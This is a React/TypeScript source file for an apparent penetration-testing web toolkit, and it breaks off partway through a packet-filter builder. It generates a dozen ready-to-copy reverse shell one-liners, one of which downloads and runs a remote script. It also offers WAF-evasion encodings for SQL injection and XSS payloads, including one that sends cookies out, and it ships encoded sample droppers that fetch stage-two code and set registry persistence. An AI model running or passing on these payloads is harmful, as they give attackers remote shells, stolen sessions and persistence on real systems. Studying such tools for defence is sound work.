"use client";

import React, { useState, useEffect, useCallback, useMemo } from "react";
import {
  Terminal,
  Shield,
  Search,
  Globe,
  Lock,
  Key,
  Cpu,
  Network,
  AlertTriangle,
  CheckCircle2,
  XCircle,
  Copy,
  Check,
  RefreshCw,
  Zap,
  Server,
  FileCode,
  Activity,
  Layers,
  Database,
} from "lucide-react";
import type { Tool } from "@/lib/tools/types";
import { useToolCard, ToolActions } from "@/components/tool/ToolPlaygrounds";

/* ============================================================================
 * HELPER: INLINE COPY BUTTON
 * ========================================================================== */
function InlineCopyButton({ text, label = "Copy" }: { text: string; label?: string }) {
  const [copied, setCopied] = useState(false);
  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(text);
      setCopied(true);
      setTimeout(() => setCopied(false), 1800);
    } catch {
      // ignore
    }
  };
  return (
    <button
      type="button"
      onClick={handleCopy}
      className="inline-flex items-center gap-1 rounded-xs border border-border bg-background px-2 py-1 font-heading text-[10px] font-bold uppercase tracking-wider text-text-muted hover:border-accent hover:text-accent transition cursor-pointer"
    >
      {copied ? <Check className="h-3 w-3 text-emerald-400" /> : <Copy className="h-3 w-3" />}
      {copied ? "Copied" : label}
    </button>
  );
}

/* ============================================================================
 * 1. REVERSE SHELL COMMAND GENERATOR
 * ========================================================================== */
function ReverseShellCommandGenerator({ tool }: { tool: Tool }) {
  const { setOutput } = useToolCard();
  const [lhost, setLhost] = useState("10.10.14.22");
  const [lport, setLport] = useState("4444");
  const [shell, setShell] = useState<"/bin/bash" | "/bin/sh" | "cmd.exe" | "powershell.exe">("/bin/bash");
  const [encoding, setEncoding] = useState<"Raw" | "URL Encoded" | "Double URL Encoded" | "Base64 Wrapped">("Raw");
  const [listenerType, setListenerType] = useState<"nc" | "rlwrap" | "socat" | "pwncat">("rlwrap");

  const host = lhost.trim() || "10.10.14.22";
  const port = lport.trim() || "4444";

  const encodePayload = useCallback(
    (raw: string) => {
      if (encoding === "Raw") return raw;
      if (encoding === "URL Encoded") return encodeURIComponent(raw);
      if (encoding === "Double URL Encoded") return encodeURIComponent(encodeURIComponent(raw));
      // Base64 Wrapped
      try {
        const b64 = typeof window !== "undefined" ? window.btoa(unescape(encodeURIComponent(raw))) : raw;
        if (shell === "powershell.exe" || shell === "cmd.exe") {
          // PowerShell UTF-16LE base64
          const bytes: number[] = [];
          for (let i = 0; i < raw.length; i++) {
            const code = raw.charCodeAt(i);
            bytes.push(code & 0xff, (code >> 8) & 0xff);
          }
          const bin = String.fromCharCode(...bytes);
          const psB64 = typeof window !== "undefined" ? window.btoa(bin) : b64;
          return `powershell.exe -NoP -NonI -W Hidden -Exec Bypass -e ${psB64}`;
        }
        return `echo ${b64} | base64 -d | ${shell}`;
      } catch {
        return raw;
      }
    },
    [encoding, shell]
  );

  const listenerCmd = useMemo(() => {
    switch (listenerType) {
      case "nc":
        return `nc -lvnp ${port}`;
      case "rlwrap":
        return `rlwrap -cAr nc -lvnp ${port}`;
      case "socat":
        return `socat -d -d file:\`tty\`,raw,echo=0 TCP4-LISTEN:${port}`;
      case "pwncat":
        return `pwncat-cs -lp ${port}`;
    }
  }, [listenerType, port]);

  const payloads = useMemo(() => {
    const rawList = [
      {
        id: "bash-tcp",
        name: "Bash TCP (/dev/tcp)",
        lang: "Linux",
        raw: `${shell} -i >& /dev/tcp/${host}/${port} 0>&1`,
      },
      {
        id: "bash-udp",
        name: "Bash UDP (/dev/udp)",
        lang: "Linux",
        raw: `${shell} -i >& /dev/udp/${host}/${port} 0>&1`,
      },
      {
        id: "python3",
        name: "Python3 PTY Socket",
        lang: "Python",
        raw: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${host}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("${shell}")'`,
      },
      {
        id: "php",
        name: "PHP fsockopen",
        lang: "PHP",
        raw: `php -r '$sock=fsockopen("${host}",${port});exec("${shell} -i <&3 >&3 2>&3");'`,
      },
      {
        id: "perl",
        name: "Perl Socket",
        lang: "Perl",
        raw: `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("${shell} -i");};'`,
      },
      {
        id: "ruby",
        name: "Ruby TCPSocket",
        lang: "Ruby",
        raw: `ruby -rsocket -e'spawn("${shell}",[:in,:out,:err]=>TCPSocket.new("${host}",${port}))'`,
      },
      {
        id: "nc-e",
        name: "Netcat Traditional (-e)",
        lang: "Netcat",
        raw: `nc -e ${shell} ${host} ${port}`,
      },
      {
        id: "nc-mkfifo",
        name: "Netcat OpenBSD FIFO",
        lang: "Netcat",
        raw: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${host} ${port} >/tmp/f`,
      },
      {
        id: "ps-tcpclient",
        name: "PowerShell TCPClient",
        lang: "Windows",
        raw: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('${host}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()"`,
      },
      {
        id: "ps-conpty",
        name: "PowerShell ConPty",
        lang: "Windows",
        raw: `IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell ${host} ${port}`,
      },
      {
        id: "socat",
        name: "Socat Full PTY",
        lang: "Linux",
        raw: `socat TCP4:${host}:${port} EXEC:${shell},pty,stderr,setsid,sigint,sane`,
      },
      {
        id: "nodejs",
        name: "Node.js child_process",
        lang: "Node.js",
        raw: `node -e 'const net=require("net"),cp=require("child_process"),sh=cp.spawn("${shell}",[]);const c=new net.Socket();c.connect(${port},"${host}",()=>{c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});'`,
      },
    ];
    return rawList.map((item) => ({
      ...item,
      encoded: encodePayload(item.raw),
    }));
  }, [host, port, shell, encodePayload]);

  const ttySnippet = `python3 -c 'import pty; pty.spawn("/bin/bash")'\nexport TERM=xterm-256color\n# Press Ctrl+Z, then run on attacker host:\nstty raw -echo; fg`;

  useEffect(() => {
    const lines = [
      `# Reverse Shell Payloads (${host}:${port} | Shell: ${shell} | Mode: ${encoding})`,
      `\n## Listener Command\n${listenerCmd}`,
      `\n## TTY Stabilization Cheat Sheet\n${ttySnippet}`,
      `\n## 12 Reverse Shell One-Liners`,
      ...payloads.map((p, i) => `${i + 1}. [${p.name}]\n${p.encoded}`),
    ];
    setOutput(lines.join("\n\n"));
  }, [host, port, shell, encoding, listenerCmd, ttySnippet, payloads, setOutput]);

  return (
    <div className="space-y-5">
      {/* Configuration Controls */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
            Attacker LHOST (IP / VPN)
          </label>
          <input
            type="text"
            value={lhost}
            onChange={(e) => setLhost(e.target.value)}
            placeholder="10.10.14.22"
            className="w-full rounded-xs border border-border bg-background px-3 py-2 text-sm font-mono-code text-text focus:border-accent focus:outline-none"
          />
        </div>

        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
            Listener LPORT
          </label>
          <input
            type="text"
            value={lport}
            onChange={(e) => setLport(e.target.value)}
            placeholder="4444"
            className="w-full rounded-xs border border-border bg-background px-3 py-2 text-sm font-mono-code text-text focus:border-accent focus:outline-none"
          />
        </div>

        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
            Target Shell Binary
          </label>
          <select
            value={shell}
            onChange={(e) => setShell(e.target.value as typeof shell)}
            className="w-full rounded-xs border border-border bg-background px-3 py-2 text-sm font-mono-code text-text focus:border-accent focus:outline-none"
          >
            <option value="/bin/bash">/bin/bash</option>
            <option value="/bin/sh">/bin/sh</option>
            <option value="cmd.exe">cmd.exe</option>
            <option value="powershell.exe">powershell.exe</option>
          </select>
        </div>

        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
            Payload Encoding Mode
          </label>
          <select
            value={encoding}
            onChange={(e) => setEncoding(e.target.value as typeof encoding)}
            className="w-full rounded-xs border border-border bg-background px-3 py-2 text-sm text-text focus:border-accent focus:outline-none"
          >
            <option value="Raw">Raw (Unencoded)</option>
            <option value="URL Encoded">URL Encoded</option>
            <option value="Double URL Encoded">Double URL Encoded</option>
            <option value="Base64 Wrapped">Base64 Wrapped</option>
          </select>
        </div>
      </div>

      {/* Listener & TTY Upgrade Bar */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
        <div className="rounded-xs border border-border bg-[#121212] p-3.5 text-white">
          <div className="flex flex-wrap items-center justify-between gap-2 mb-2">
            <span className="font-heading text-[11px] font-bold uppercase tracking-wider text-[#ff6a00]">
              1. Start Attacker Listener
            </span>
            <div className="flex flex-wrap gap-1">
              {(
                [
                  { id: "nc", label: "nc -lvnp" },
                  { id: "rlwrap", label: "rlwrap nc" },
                  { id: "socat", label: "socat" },
                  { id: "pwncat", label: "pwncat-cs" },
                ] as const
              ).map((item) => (
                <button
                  key={item.id}
                  type="button"
                  onClick={() => setListenerType(item.id)}
                  className={`rounded-xs px-2 py-0.5 font-mono-code text-[10px] cursor-pointer transition ${
                    listenerType === item.id
                      ? "bg-[#ff6a00] text-white font-bold"
                      : "bg-white/10 text-gray-300 hover:bg-white/20"
                  }`}
                >
                  {item.label}
                </button>
              ))}
            </div>
          </div>
          <div className="flex items-center justify-between gap-2">
            <pre className="font-mono-code text-xs text-emerald-400 overflow-x-auto whitespace-pre-wrap break-all">
              $ {listenerCmd}
            </pre>
            <InlineCopyButton text={listenerCmd} />
          </div>
        </div>

        <div className="rounded-xs border border-border bg-[#121212] p-3.5 text-white">
          <div className="flex items-center justify-between mb-2">
            <span className="font-heading text-[11px] font-bold uppercase tracking-wider text-[#ff6a00]">
              2. Full Interactive TTY Upgrade Cheat Sheet
            </span>
            <InlineCopyButton text={`python3 -c 'import pty; pty.spawn("/bin/bash")'`} label="Copy PTY" />
          </div>
          <pre className="font-mono-code text-[11px] text-amber-300 overflow-x-auto whitespace-pre-wrap">
            {`python3 -c 'import pty; pty.spawn("/bin/bash")' && export TERM=xterm\n# Ctrl+Z -> stty raw -echo; fg`}
          </pre>
        </div>
      </div>

      {/* 12 Reverse Shell Cards */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
        {payloads.map((item) => (
          <div
            key={item.id}
            className="rounded-xs border border-border bg-background p-3 flex flex-col justify-between gap-2"
          >
            <div className="flex items-center justify-between gap-2">
              <div className="flex items-center gap-2">
                <span className="font-heading text-xs font-bold uppercase tracking-wider text-text">
                  {item.name}
                </span>
                <span className="rounded-xs bg-[#ff6a00]/15 px-1.5 py-0.5 font-mono-code text-[10px] font-semibold text-accent">
                  {item.lang}
                </span>
              </div>
              <InlineCopyButton text={item.encoded} />
            </div>
            <pre className="rounded-xs bg-[#121212] p-2.5 font-mono-code text-xs text-emerald-400 overflow-x-auto whitespace-pre-wrap break-all">
              {item.encoded}
            </pre>
          </div>
        ))}
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 2. SQLi & XSS PAYLOAD ENCODER LAB
 * ========================================================================== */
function SqliXssPayloadEncoderLab({ tool }: { tool: Tool }) {
  const { setOutput } = useToolCard();
  const [payload, setPayload] = useState(`' OR 1=1-- -`);
  const [applySpaceBypass, setApplySpaceBypass] = useState(false);
  const [applyCaseRandom, setApplyCaseRandom] = useState(false);

  const presets = [
    { label: "Auth Bypass", value: `' OR 1=1-- -` },
    {
      label: "UNION Select Enumerator",
      value: `' UNION SELECT NULL,table_name,column_name FROM information_schema.columns-- -`,
    },
    { label: "Time-Based Blind SQLi", value: `' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -` },
    {
      label: "Polyglot XSS",
      value: `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=alert(document.domain) )//</stYle/</titLe/</scRipt/--!><sVg/oNloAd=alert(1)//>`,
    },
    { label: "SVG/Img OnError XSS", value: `<svg/onload=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>` },
    {
      label: "DOM XSS",
      value: `"><img src=x onerror=fetch('https://collector.example.com/?c='+btoa(document.cookie))>`,
    },
  ];

  const mutatedBase = useMemo(() => {
    let result = payload;
    if (applyCaseRandom) {
      result = result
        .split("")
        .map((ch, idx) => (idx % 2 === 0 ? ch.toUpperCase() : ch.toLowerCase()))
        .join("");
    }
    if (applySpaceBypass) {
      result = result.replace(/ /g, "/**/");
    }
    return result;
  }, [payload, applySpaceBypass, applyCaseRandom]);

  const encodings = useMemo(() => {
    const src = mutatedBase;
    const bytes = Array.from(src).map((c) => c.charCodeAt(0));

    const urlEncoded = Array.from(src)
      .map((c) => `%${c.charCodeAt(0).toString(16).padStart(2, "0").toUpperCase()}`)
      .join("");

    const doubleUrlEncoded = Array.from(src)
      .map((c) => `%25${c.charCodeAt(0).toString(16).padStart(2, "0").toUpperCase()}`)
      .join("");

    const hex0x = "0x" + bytes.map((b) => b.toString(16).padStart(2, "0")).join("");

    const sqlChar = `CHAR(${bytes.join(",")})`;

    const unicodeEscaped = bytes.map((b) => `\\u${b.toString(16).padStart(4, "0")}`).join("");

    const htmlEntities = bytes.map((b) => `&#x${b.toString(16)};`).join("");

    const commentBypass = payload.replace(/ /g, "/**/");

    const caseRandomized = payload
      .split("")
      .map((ch, i) => (i % 2 === 0 ? ch.toUpperCase() : ch.toLowerCase()))
      .join("");

    return [
      { name: "URL Encoded (All Chars)", desc: "Bypasses naive keyword filters inspecting raw query strings", value: urlEncoded },
      { name: "Double URL Encoded (%25XX)", desc: "Evades WAFs that decode URL parameters once before backend double-decoding", value: doubleUrlEncoded },
      { name: "Hex Literal (0x...)", desc: "MySQL/MSSQL hex string literal without single quotes", value: hex0x },
      { name: "SQL CHAR(...) Concatenation", desc: "Constructs strings dynamically without quotes to evade quote escaping", value: sqlChar },
      { name: "Unicode Escape (\\u00XX)", desc: "JSON / JS engine unicode escape sequences for XSS & WAF bypass", value: unicodeEscaped },
      { name: "HTML Hex Entities (&#xXX;)", desc: "Renders inside HTML attribute contexts without raw angle brackets or quotes", value: htmlEntities },
      { name: "SQL Comment Space Bypass (/**/)", desc: "Replaces whitespace with inline C-style SQL comments", value: commentBypass },
      { name: "Case Randomization (SeLeCt)", desc: "Defeats case-sensitive regex WAF rules lacking /i modifier", value: caseRandomized },
    ];
  }, [mutatedBase, payload]);

  useEffect(() => {
    const out = [
      `# Raw Input Payload\n${payload}`,
      `# Active Base Payload\n${mutatedBase}`,
      `# WAF Evasion Encodings`,
      ...encodings.map((e) => `## ${e.name}\n${e.value}`),
    ].join("\n\n");
    setOutput(out);
  }, [payload, mutatedBase, encodings, setOutput]);

  return (
    <div className="space-y-5">
      <div>
        <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-2">
          Quick Injection Presets
        </label>
        <div className="flex flex-wrap gap-1.5">
          {presets.map((p) => (
            <button
              key={p.label}
              type="button"
              onClick={() => setPayload(p.value)}
              className={`rounded-xs border px-2.5 py-1.5 font-heading text-xs font-semibold uppercase tracking-wider transition cursor-pointer ${
                payload === p.value
                  ? "border-accent bg-[#ff6a00] text-white"
                  : "border-border bg-background text-text-muted hover:border-accent hover:text-text"
              }`}
            >
              {p.label}
            </button>
          ))}
        </div>
      </div>

      <div>
        <div className="flex flex-wrap items-center justify-between gap-2 mb-1.5">
          <label className="font-heading text-xs font-bold uppercase tracking-wider text-text-muted">
            Input SQLi / XSS Payload
          </label>
          <div className="flex flex-wrap items-center gap-3">
            <label className="inline-flex items-center gap-1.5 text-xs text-text cursor-pointer">
              <input
                type="checkbox"
                checked={applySpaceBypass}
                onChange={(e) => setApplySpaceBypass(e.target.checked)}
                className="accent-[#ff6a00]"
              />
              Pre-chain <code className="font-mono-code text-accent">/**/</code> Space Bypass
            </label>
            <label className="inline-flex items-center gap-1.5 text-xs text-text cursor-pointer">
              <input
                type="checkbox"
                checked={applyCaseRandom}
                onChange={(e) => setApplyCaseRandom(e.target.checked)}
                className="accent-[#ff6a00]"
              />
              Pre-chain <code className="font-mono-code text-accent">CaSe RaNdOm</code>
            </label>
          </div>
        </div>
        <textarea
          rows={3}
          value={payload}
          onChange={(e) => setPayload(e.target.value)}
          className="w-full rounded-xs border border-border bg-background p-3 font-mono-code text-sm text-text focus:border-accent focus:outline-none"
        />
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
        {encodings.map((enc) => (
          <div key={enc.name} className="rounded-xs border border-border bg-background p-3 space-y-1.5">
            <div className="flex items-center justify-between gap-2">
              <span className="font-heading text-xs font-bold uppercase tracking-wider text-text">
                {enc.name}
              </span>
              <InlineCopyButton text={enc.value} />
            </div>
            <p className="text-[11px] text-text-muted">{enc.desc}</p>
            <pre className="rounded-xs bg-[#121212] p-2.5 font-mono-code text-xs text-emerald-400 overflow-x-auto whitespace-pre-wrap break-all">
              {enc.value}
            </pre>
          </div>
        ))}
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 3. MALWARE DEOBFUSCATOR (CYBERCHEF LITE)
 * ========================================================================== */
const SAMPLE_PS_ENC = `powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AYwAyAC4AcwBpAGwAZQBuAHQAbgBlAHgAdQBzAC4AaQBvAC8AcwB0AGEAZwBlADIALgBwAHMAMQAnACkAOwAgAHIAZQBnACAAYQBkAGQAIABIAEsAQwBVAFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4AIAAvAHYAIABVAHAAZABhAHQAZQByACAALwBkACAAQwA6AFwAVQBzAGUAcgBzAFwAUAB1AGIAbABpAGMAXABiAGUAYQBjAG8AbgAuAGUAeABlADsAIABwAGkAbgBnACAAMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA0AA==`;

const SAMPLE_JS_EVAL = `eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,100,114,111,112,112,101,114,46,109,97,108,119,97,114,101,45,99,50,46,110,101,116,47,112,97,121,108,111,97,100,46,106,115,39,41)); var gate = "\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x31\\x39\\x38\\x2e\\x35\\x31\\x2e\\x31\\x30\\x30\\x2e\\x37\\x37\\x2f\\x67\\x61\\x74\\x65\\x2e\\x70\\x68\\x70"; // HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Persistence`;

// Hex string XORed with key 0x5A: "http://45.33.32.156:8080/beacon.bin HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Sync"
const SAMPLE_XOR_HEX = (() => {
  const plain = "curl -s http://45.33.32.156:8080/beacon.bin -o /tmp/b && reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Sync";
  return Array.from(plain)
    .map((c) => (c.charCodeAt(0) ^ 0x5a).toString(16).padStart(2, "0"))
    .join("");
})();

function MalwareDeobfuscatorCyberChefLite({ tool }: { tool: Tool }) {
  const { setOutput } = useToolCard();
  const [input, setInput] = useState(SAMPLE_PS_ENC);

  const analysis = useMemo(() => {
    const layers: { title: string; detail: string }[] = [];
    let combinedText = input;

    // 1. Detect PowerShell Base64 (-enc / -EncodedCommand or standalone Base64)
    const b64Matches = input.match(/[A-Za-z0-9+/=]{28,}/g) || [];
    for (const token of b64Matches) {
      if (token.length % 4 === 0 && !/^[0-9a-fA-F]+$/.test(token)) {
        try {
          const bin = typeof window !== "undefined" ? window.atob(token) : "";
          if (bin) {
            // Check UTF-16LE (common in PowerShell -enc where odd bytes are 0x00)
            let zeroCount = 0;
            for (let i = 1; i < bin.length; i += 2) {
              if (bin.charCodeAt(i) === 0) zeroCount++;
            }
            if (zeroCount > bin.length / 4) {
              let utf16 = "";
              for (let i = 0; i < bin.length; i += 2) {
                const code = bin.charCodeAt(i) | (bin.charCodeAt(i + 1) << 8);
                if (code >= 32 && code <= 126) utf16 += String.fromCharCode(code);
              }
              if (utf16.length > 4) {
                layers.push({
                  title: "PowerShell UTF-16LE Base64 Decoded (-EncodedCommand)",
                  detail: utf16,
                });
                combinedText += "\n" + utf16;
              }
            } else {
              // Standard ASCII Base64
              const printable = bin.replace(/[^\x20-\x7E]/g, "");
              if (printable.length > bin.length * 0.8) {
                layers.push({
                  title: "Standard UTF-8 Base64 Decoded",
                  detail: printable,
                });
                combinedText += "\n" + printable;
              }
            }
          }
        } catch {
          // ignore invalid b64
        }
      }
    }

    // 2. Unpack String.fromCharCode(...)
    const charCodeRegex = /String\.fromCharCode\(([0-9,\s]+)\)/gi;
    let match: RegExpExecArray | null;
    while ((match = charCodeRegex.exec(input)) !== null) {
      const nums = match[1]
        .split(",")
        .map((n) => parseInt(n.trim(), 10))
        .filter((n) => !isNaN(n));
      if (nums.length > 0) {
        const unpacked = String.fromCharCode(...nums);
        layers.push({
          title: `Unpacked String.fromCharCode (${nums.length} chars)`,
          detail: unpacked,
        });
        combinedText += "\n" + unpacked;
      }
    }

    // 3. Unpack \xXX Hex Escape Sequences
    const hexEscapeMatches = input.match(/(?:\\x[0-9a-fA-F]{2}){4,}/g) || [];
    for (const seq of hexEscapeMatches) {
      const bytes = seq
        .split("\\x")
        .filter(Boolean)
        .map((h) => parseInt(h, 16));
      const unpacked = String.fromCharCode(...bytes);
      layers.push({
        title: "Unpacked \\xXX Hex Escape Sequence",
        detail: unpacked,
      });
      combinedText += "\n" + unpacked;
    }

    // 4. Single-Byte XOR Brute-Force (0x01 - 0xFF) on contiguous hex strings
    const rawHexClean = input.trim().replace(/^0x/i, "").replace(/\s+/g, "");
    let xorBest: { key: number; text: string; score: number } | null = null;
    if (/^[0-9a-fA-F]{20,}$/.test(rawHexClean) && rawHexClean.length % 2 === 0) {
      const byteArr: number[] = [];
      for (let i = 0; i < rawHexClean.length; i += 2) {
        byteArr.push(parseInt(rawHexClean.slice(i, i + 2), 16));
      }
      for (let key = 1; key <= 255; key++) {
        let candidate = "";
        let score = 0;
        for (let i = 0; i < byteArr.length; i++) {
          const c = byteArr[i] ^ key;
          if (c >= 32 && c <= 126) {
            score += 2;
            const ch = String.fromCharCode(c);
            if (/[a-zA-Z0-9/:._\-\\ ]/.test(ch)) score += 3;
            candidate += ch;
          } else {
            score -= 10;
          }
        }
        if (/http|curl|powershell|cmd|HKLM|HKCU|exec|eval/i.test(candidate)) {
          score += 60;
        }
        if (!xorBest || score > xorBest.score) {
          xorBest = { key, text: candidate, score };
        }
      }
      if (xorBest && xorBest.score > 0) {
        layers.push({
          title: `Single-Byte XOR Brute-Forced (Winning Key: 0x${xorBest.key.toString(16).toUpperCase().padStart(2, "0")})`,
          detail: xorBest.text,
        });
        combinedText += "\n" + xorBest.text;
      }
    }

    // 5. Extract IOCs from combinedText
    const urls = Array.from(new Set(combinedText.match(/https?:\/\/[^\s'"<>)+;]+/gi) || []));
    const ips = Array.from(
      new Set(combinedText.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g) || [])
    );
    const regKeys = Array.from(
      new Set(combinedText.match(/\b(?:HKLM|HKCU|HKEY_LOCAL_MACHINE|HKEY_CURRENT_USER)\\[^\s'";)]+/gi) || [])
    );
    const domains = Array.from(
      new Set(
        urls
          .map((u) => {
            try {
              return new URL(u).hostname;
            } catch {
              return "";
            }
          })
          .filter((h) => h && !/^\d+\.\d+\.\d+\.\d+$/.test(h))
      )
    );

    return { layers, urls, ips, domains, regKeys };
  }, [input]);

  useEffect(() => {
    const out = [
      `# Malware Deobfuscation & IOC Triage Report`,
      ...analysis.layers.map((l) => `## ${l.title}\n${l.detail}`),
      `## Extracted Indicators of Compromise (IOCs)`,
      `IPv4 Addresses : ${analysis.ips.join(", ") || "None"}`,
      `URLs           : ${analysis.urls.join(", ") || "None"}`,
      `Domains        : ${analysis.domains.join(", ") || "None"}`,
      `Registry Keys  : ${analysis.regKeys.join(", ") || "None"}`,
    ].join("\n\n");
    setOutput(out);
  }, [analysis, setOutput]);

  return (
    <div className="space-y-5">
      <div className="flex flex-wrap items-center justify-between gap-2">
        <span className="font-heading text-xs font-bold uppercase tracking-wider text-text-muted">
          Load Obfuscated Malware Sample
        </span>
        <div className="flex flex-wrap gap-2">
          <button
            type="button"
            onClick={() => setInput(SAMPLE_PS_ENC)}
            className="rounded-xs border border-border bg-background px-3 py-1.5 font-heading text-xs font-semibold uppercase tracking-wider text-text hover:border-accent cursor-pointer"
          >
            Obfuscated PowerShell -enc
          </button>
          <button
            type="button"
            onClick={() => setInput(SAMPLE_JS_EVAL)}
            className="rounded-xs border border-border bg-background px-3 py-1.5 font-heading text-xs font-semibold uppercase tracking-wider text-text hover:border-accent cursor-pointer"
          >
            Hex/CharCode JS Eval
          </button>
          <button
            type="button"
            onClick={() => setInput(SAMPLE_XOR_HEX)}
            className="rounded-xs border border-border bg-background px-3 py-1.5 font-heading text-xs font-semibold uppercase tracking-wider text-text hover:border-accent cursor-pointer"
          >
            XOR Encoded Stub (0x5A)
          </button>
        </div>
      </div>

      <textarea
        rows={4}
        value={input}
        onChange={(e) => setInput(e.target.value)}
        placeholder="Paste obfuscated PowerShell -enc, JS String.fromCharCode, \xXX hex strings, or raw XOR-encoded hex..."
        className="w-full rounded-xs border border-border bg-background p-3 font-mono-code text-xs text-text focus:border-accent focus:outline-none"
      />

      {/* Deobfuscation Layers */}
      <div className="space-y-3">
        <h4 className="font-heading text-xs font-bold uppercase tracking-wider text-text">
          Automated Deobfuscation Pipeline ({analysis.layers.length} Layer{analysis.layers.length === 1 ? "" : "s"} Unpacked)
        </h4>
        {analysis.layers.length === 0 ? (
          <div className="rounded-xs border border-border bg-background p-4 text-xs text-text-muted">
            No recognized encoding layer detected yet. Paste a Base64 PowerShell command, CharCode array, \xXX string, or hex XOR stub.
          </div>
        ) : (
          analysis.layers.map((layer, idx) => (
            <div key={idx} className="rounded-xs border border-border bg-[#121212] p-3.5 text-white space-y-2">
              <div className="flex items-center justify-between">
                <span className="font-heading text-xs font-bold uppercase tracking-wider text-[#ff6a00]">
                  Stage {idx + 1}: {layer.title}
                </span>
                <InlineCopyButton text={layer.detail} />
              </div>
              <pre className="font-mono-code text-xs text-emerald-400 overflow-x-auto whitespace-pre-wrap break-all">
                {layer.detail}
              </pre>
            </div>
          ))
        )}
      </div>

      {/* Extracted IOCs */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
        {[
          { label: "IPv4 C2 Nodes", items: analysis.ips },
          { label: "Stage-2 URLs", items: analysis.urls },
          { label: "Extracted Domains", items: analysis.domains },
          { label: "Registry Persistence", items: analysis.regKeys },
        ].map((group) => (
          <div key={group.label} className="rounded-xs border border-border bg-background p-3">
            <div className="font-heading text-[11px] font-bold uppercase tracking-wider text-accent mb-2">
              {group.label} ({group.items.length})
            </div>
            {group.items.length === 0 ? (
              <span className="text-xs text-text-muted">None detected</span>
            ) : (
              <ul className="space-y-1 font-mono-code text-xs text-text break-all">
                {group.items.map((ioc) => (
                  <li key={ioc} className="rounded-xs bg-surface px-2 py-1 border border-border/60">
                    {ioc}
                  </li>
                ))}
              </ul>
            )}
          </div>
        ))}
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 4. WIRESHARK & TCPDUMP FILTER BUILDER
 * ========================================================================== */
function WiresharkTcpdumpFilterBuilder({ tool }: { tool: Tool }) {
  const { setOutput } = useToolCard();
  const [srcIp, setSrcIp] = useState("10.10.14.22");
  const [dstIp, setDstIp] = useState("192.168.1.0/24");
  const [port, setPort] = useState("443");
  const [protocol, setProtocol] = useState<"TCP" | "UDP" | "HTTP" | "DNS" | "TLS" | "ARP" | "ICMP">("TCP");
  const [flags, setFlags] = useState<Record<string, boolean>>({
    SYN: true,
    ACK: false,
    FIN: false,
    RST: false,
    PSH: false,
  });
  const [httpMethod, setHttpMethod] = useState("POST");
  const [httpStatus, setHttpStatus] = useState("200");
  const [payloadContains, setPayloadContains] = useState("password");
  const [excludeNoise, setExcludeNoise] = useState(true);

  const toggleFlag = (f: string) => setFlags((prev) => ({ ...prev, [f]: !prev[f] }));

  const { wiresharkFilter, tcpdumpCmd } = useMemo(() => {
    const wsParts: string[] = [];
    const bpfParts: string[] = [];

    // Protocol
    const protoLower = protocol.toLowerCase();
    wsParts.push(protoLower);
    if (["tcp", "udp", "arp", "icmp"].includes(protoLower)) {
      bpfParts.push(protoLower);
    } else if (protocol === "DNS") {
      bpfParts.push("port 53");
    } else if (protocol === "HTTP") {
      bpfParts.push("tcp port 80");
    } else if (protocol === "TLS") {
      bpfParts.push("tcp port 443");
    }

    // Source / Dest IP
    if (srcIp.trim()) {
